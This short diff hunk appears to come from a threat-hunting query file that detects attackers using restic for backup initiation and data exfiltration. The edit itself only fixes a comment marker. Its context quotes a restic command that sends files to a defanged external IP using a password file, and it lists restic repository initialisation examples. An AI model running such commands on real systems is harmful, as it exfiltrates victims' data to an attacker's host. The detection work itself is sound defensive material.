@@ -58,7 +58,7 @@ restic.exe -r rest:http://195.123.226[.]84:8000/ --password-file ppp.txt --use-f
 //-> Microsoft Azure Blob Storage: restic -r azure:foo:/ init
 //-> Google Cloud Storage: restic -r gs:foo:/ init
 //-> rclone: restic -r rclone:foo:bar init
-/Title: Detect the Use of Restic for Backup Repository Initiation and Data Exfiltration.
+//Title: Detect the Use of Restic for Backup Repository Initiation and Data Exfiltration.
 //QKL Advanced hunting query:
 let timeframe = 24hr;
 // Detection 1: Traffic related to Restic API HTTP header request
